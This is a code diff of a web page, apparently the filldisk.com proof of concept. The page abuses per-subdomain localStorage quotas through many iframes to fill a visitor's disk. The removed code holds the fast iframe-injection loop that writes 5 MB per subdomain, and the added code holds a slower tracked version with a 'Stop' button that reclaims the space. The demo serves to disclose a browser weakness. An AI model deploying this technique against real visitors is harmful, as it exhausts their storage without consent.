@@ -3,70 +3,80 @@
 <head>
   <meta charset="utf-8">
   <style>
-    body { background: red; }
-    iframe { height: 0; }
+    iframe { border: 1px; height: 50px; width: 100%; }
   </style>
 </head>
 <body>
-<div></div>
+
+<p>
+  Used <span class="mb"></span> MB of disk space!
+</p>
+
+<button class="free">Stop</button>
+
+<iframe src="http://1.filldisk.com/frame.html?free=0&amp;highest=0"></iframe>
+
+<!-- <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> -->
+
 <script>
+var mb = document.querySelector('.mb')
+var free = document.querySelector('.free')
+var frame = document.querySelector('iframe')
 
-var frameNum = window.location.hash.length
-  ? parseInt(window.location.hash.substring(1))
-  : 1
-var body = document.getElementsByTagName('body')[0]
-var div = document.getElementsByTagName('div')[0]
-
-function injectFrames(num) {
-  for (var i = 0; i < num; i++) {
-    var iframe = document.createElement('iframe')
-    iframe.src = 'http://' + frameNum + '.filldisk.com'
-    body.appendChild(iframe)
-
-    frameNum += 1
-    // if (frameNum % 50 == 0) {
-    //   window.setTimeout(function () {
-    //     window.location.hash = frameNum + 1
-    //     window.location.reload()
-    //   }, 5000)
-    //   window.clearInterval(window.myInt)
-    // }
-  }
+if (!localStorage['highest']) {
+  localStorage['highest'] = 1
 }
 
-// Top frame
-if (window.top == window.self) {
-  window.myInt = window.setInterval(function () {
-    injectFrames(5)
-    div.innerHTML = 'Used ' + (frameNum * 5) + 'MB of space.'
-  }, 50)
+window.addEventListener('message', onMessage, false)
+free.addEventListener('click', freeSpace, false)
 
-// Sub frames
-} else {
-  // The following code adapted from http://arty.name/localstorage.html
+function onMessage (event) {
 
-  function repeat(string, count) {
-      var array = [];
-      while (count--) {
-    array.push(string);
-      }
-      return array.join('');
-  }
+  var frameNum = event.data
 
-  var n10b =    '0123456789';
-  var n100b =   repeat(n10b, 10);
-  var n1kib =   repeat(n100b, 10);
-  var n10kib =  repeat(n1kib, 10);
-  var n100kib = repeat(n10kib, 10);
-  var n5mib =   repeat(n100kib, 25);
+  /**
+   * Save the highest subdomain that we've set data on,
+   * so that we can reclaim the space later.
+   */
 
-  // Set 5 MB
   try {
-    localStorage.filldisk = n5mib;
-    div.innerHTML = 'Set ' + n5mib.length + ' chars into localstorage on ' + window.location.hostname
+    localStorage['highest'] = frameNum
   } catch (e) {
-    alert('local storage exception')
+    console.error('local storage exception')
+    return
   }
+
+  /**
+   * Calculate the amount of used space in MB
+   */
+
+  var usedMB = parseInt(localStorage['highest']) * 5
+  mb.innerHTML = usedMB
+
+  /**
+   * Set background of page to match amount of used space.
+   */
+
+   var nonRed = (255 - Math.min(parseInt(event.data), 255)).toString(16)
+   document.body.style.background = '#FF' + nonRed + nonRed
+
+}
+
+/**
+ * Injects a CSS style tag into page.
+ * @param  {String} rules CSS rules to inject
+ */
+
+function injectFrame (src) {
+  var frame = document.createElement('iframe')
+  frame.src = src
+  document.getElementsByTagName('body')[0].appendChild(frame)
+}
+
+function freeSpace (event) {
+  alert('free')
+  frame.src = 'http://' + localStorage.highest + '.filldisk.com/frame.html?free=true&highest=' + localStorage.highest
+
 }
 
 </script>
